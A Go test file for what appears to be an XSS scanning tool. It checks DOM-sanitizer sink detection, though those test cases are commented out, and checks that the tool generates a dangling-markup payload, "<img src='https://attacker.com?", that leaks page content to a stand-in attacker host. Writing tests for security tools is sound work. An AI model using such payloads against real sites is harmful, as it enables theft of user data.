package tests

import (
	"strings"
	"testing"

	"github.com/lcalzada-xor/xxss/v2/pkg/logger"
	"github.com/lcalzada-xor/xxss/v2/pkg/scanner/dom"
	"github.com/lcalzada-xor/xxss/v2/pkg/scanner/payloads"
)

func TestMXSSDetection(t *testing.T) {
	// Setup scanner
	log := logger.NewLogger(0)
	scanner := dom.NewDOMScanner(log)

	tests := []struct {
		name     string
		input    string
		expected string
	}{
		// {
		// 	name:     "DOMPurify.sanitize usage",
		// 	input:    `<script>var clean = DOMPurify.sanitize(location.hash);</script>`,
		// 	expected: "DOMPurify.sanitize",
		// },
		// {
		// 	name:     "sanitizeHtml usage",
		// 	input:    `<script>var clean = sanitizeHtml(location.hash);</script>`,
		// 	expected: "sanitizeHtml",
		// },
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			findings := scanner.ScanDOM(tt.input)
			found := false
			for _, f := range findings {
				if f.Sink == tt.expected {
					found = true
					break
				}
			}
			if !found {
				t.Errorf("Expected finding for sink '%s', but got none. Findings: %v", tt.expected, findings)
			}
		})
	}
}

func TestDanglingMarkupPayload(t *testing.T) {
	callback := "https://attacker.com"
	generatedPayloads := payloads.BlindPayloads(callback)

	found := false
	expected := "<img src='https://attacker.com?"
	for _, p := range generatedPayloads {
		if strings.Contains(p, expected) {
			found = true
			break
		}
	}

	if !found {
		t.Errorf("Expected dangling markup payload containing '%s', but not found. Payloads: %v", expected, generatedPayloads)
	}
}
